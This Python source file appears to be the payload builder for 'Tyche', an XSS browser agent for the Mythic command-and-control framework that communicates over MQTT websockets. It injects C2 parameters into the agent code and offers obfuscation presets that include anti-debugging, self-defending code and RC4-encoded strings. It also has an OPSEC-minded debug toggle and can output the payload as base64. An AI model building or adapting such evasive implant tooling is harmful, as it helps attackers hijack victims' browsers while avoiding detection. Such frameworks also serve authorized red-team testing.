from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio, pathlib, os, tempfile, base64, json, subprocess


# =========================================================================
# javascript-obfuscator preset configurations
# =========================================================================
OBFUSCATION_PRESETS = {
    "none": None,

    "light": {
        "compact": True,
        "controlFlowFlattening": False,
        "deadCodeInjection": False,
        "debugProtection": False,
        "disableConsoleOutput": False,
        "identifierNamesGenerator": "hexadecimal",
        "renameGlobals": False,
        "selfDefending": False,
        "stringArray": True,
        "stringArrayEncoding": ["base64"],
        "stringArrayThreshold": 0.75,
        "unicodeEscapeSequence": False,
    },

    "medium": {
        "compact": True,
        "controlFlowFlattening": True,
        "controlFlowFlatteningThreshold": 0.5,
        "deadCodeInjection": True,
        "deadCodeInjectionThreshold": 0.3,
        "debugProtection": False,
        "disableConsoleOutput": False,
        "identifierNamesGenerator": "hexadecimal",
        "renameGlobals": False,
        "selfDefending": False,
        "stringArray": True,
        "stringArrayEncoding": ["base64"],
        "stringArrayRotate": True,
        "stringArrayShuffle": True,
        "stringArrayThreshold": 0.75,
        "splitStrings": True,
        "splitStringsChunkLength": 10,
        "unicodeEscapeSequence": False,
    },

    "heavy": {
        "compact": True,
        "controlFlowFlattening": True,
        "controlFlowFlatteningThreshold": 0.75,
        "deadCodeInjection": True,
        "deadCodeInjectionThreshold": 0.4,
        "debugProtection": True,
        "debugProtectionInterval": 2000,
        "disableConsoleOutput": True,
        "identifierNamesGenerator": "hexadecimal",
        "renameGlobals": True,
        "selfDefending": True,
        "stringArray": True,
        "stringArrayEncoding": ["rc4"],
        "stringArrayRotate": True,
        "stringArrayShuffle": True,
        "stringArrayThreshold": 1,
        "splitStrings": True,
        "splitStringsChunkLength": 5,
        "transformObjectKeys": True,
        "unicodeEscapeSequence": True,
    },
}


class Tyche(PayloadType):

    name = "tyche"
    file_extension = "js"
    author = "@grampae"
    supported_os = [
        SupportedOS("Browser")
    ]
    mythic_encrypts = True
    note = "Tyche is a JS XSS agent that communicates over MQTT Websockets"
    supports_dynamic_loading = True
    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["js", "base64"],
            default_value="js"
        ),
        BuildParameter(
            name="obfuscation",
            parameter_type=BuildParameterType.ChooseOne,
            description="JS obfuscation level (requires javascript-obfuscator in container)",
            choices=["none", "light", "medium", "heavy"],
            default_value="none"
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            description="Enable console.log output (disable for OPSEC)",
            default_value=False
        ),
        BuildParameter(
            name="embed_mqtt",
            parameter_type=BuildParameterType.Boolean,
            description="Embed mqtt.js library (self-contained, ~360KB larger) vs load from CDN",
            default_value=True
        ),
    ]
    c2_profiles = ["mqtt"]

    agent_path = pathlib.Path(".") / "tyche" / "mythic"
    agent_icon_path = pathlib.Path(".") / "tyche" / "mythic" / "tyche.svg"
    agent_code_path = pathlib.Path(".") / "tyche" / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Creating script payload"),
        BuildStep(step_name="Applying Config", step_description="Injecting C2 parameters and commands"),
        BuildStep(step_name="Obfuscating Script", step_description="Running javascript-obfuscator")
    ]

    translation_container = None

    def getJSFile(self, directory, filename):
        """Find a .js file in the given directory"""
        filepath = os.path.join(directory, "{}.js".format(filename))
        if os.path.exists(filepath):
            return filepath
        return ""

    def run_obfuscator(self, code, preset_name):
        """Run javascript-obfuscator on the code with the given preset config."""
        preset = OBFUSCATION_PRESETS.get(preset_name)
        if not preset:
            return code

        # Write code and config to temp files
        with tempfile.NamedTemporaryFile(mode="w", suffix=".js", delete=False) as f_in:
            f_in.write(code)
            input_path = f_in.name

        output_path = input_path + ".obf.js"
        config_path = input_path + ".config.json"

        try:
            with open(config_path, "w") as f_cfg:
                json.dump(preset, f_cfg)

            result = subprocess.run(
                [
                    "javascript-obfuscator", input_path,
                    "--output", output_path,
                    "--config", config_path
                ],
                capture_output=True,
                text=True,
                timeout=120
            )

            if result.returncode != 0:
                raise Exception(
                    "javascript-obfuscator failed: {}".format(
                        result.stderr.strip() or result.stdout.strip()
                    )
                )

            with open(output_path, "r") as f_out:
                return f_out.read()

        finally:
            for path in [input_path, output_path, config_path]:
                try:
                    os.unlink(path)
                except OSError:
                    pass

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)
        build_msg = ""
        try:
            # ---- Step 1: Gather command code files ----
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.getJSFile(self.agent_code_path, cmd)
                if not command_path:
                    build_msg += "{} command not found as .js file.\n".format(cmd)
                else:
                    command_code += (
                        open(command_path, "r").read() + "\n"
                    )

            # Read base agent
            base_agent_path = self.getJSFile(
                os.path.join(self.agent_code_path, "base_agent"), "base_agent"
            )
            if not base_agent_path:
                raise Exception("base_agent.js not found in agent_code/base_agent/")

            base_code = open(base_agent_path, "r").read()

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found base agent and {} command(s)".format(
                    len(self.commands.get_commands())
                ),
                StepSuccess=True
            ))

            # ---- Step 2: Inject config ----
            # Replace Mythic UUID
            base_code = base_code.replace("UUID_HERE", self.uuid)

            # Replace command code
            base_code = base_code.replace("//COMMANDS_HERE", command_code)

            # Replace debug flag
            debug_val = "true" if self.get_parameter("debug") else "false"
            base_code = base_code.replace("agent_debug", debug_val)

            # Replace C2 profile parameters
            for c2 in self.c2info:
                profile = c2.get_c2profile()["name"]

                for key, val in c2.get_parameters_dict().items():
                    if isinstance(val, dict):
                        base_code = base_code.replace(key, json.dumps(val))
                    elif isinstance(val, bool):
                        base_code = base_code.replace(key, "true" if val else "false")
                    elif isinstance(val, (int, float)):
                        base_code = base_code.replace(key, str(val))
                    else:
                        base_code = base_code.replace(key, str(val))

            if build_msg != "":
                resp.build_stderr = build_msg

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Applying Config",
                StepStdout="Config injected for profile: {}".format(
                    ", ".join([c2.get_c2profile()["name"] for c2 in self.c2info])
                ),
                StepSuccess=True
            ))

            # ---- Step 3: Obfuscation ----
            obf_level = self.get_parameter("obfuscation")

            if obf_level != "none":
                base_code = self.run_obfuscator(base_code, obf_level)

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Obfuscated with '{}' preset.".format(obf_level),
                    StepSuccess=True
                ))
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="No obfuscation requested, skipping.",
                    StepSuccess=True
                ))

            # ---- Step 4: Embed or reference mqtt.js ----
            embed_mqtt = self.get_parameter("embed_mqtt")
            if embed_mqtt:
                mqtt_path = os.path.join(self.agent_code_path, "base_agent", "mqtt.min.js")
                if os.path.exists(mqtt_path):
                    mqtt_code = open(mqtt_path, "r").read()
                    # Prepend mqtt.js so it's available when agent runs
                    base_code = mqtt_code + "\n" + base_code
                    mqtt_msg = "embedded (~360KB)"
                else:
                    # Fallback to CDN if file missing
                    mqtt_msg = "CDN (mqtt.min.js not found)"
            else:
                mqtt_msg = "CDN"

            # ---- Output ----
            if self.get_parameter("output") == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully built (base64, obfuscation: {}, mqtt: {})".format(obf_level, mqtt_msg)
            else:
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built (obfuscation: {}, mqtt: {})".format(obf_level, mqtt_msg)

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
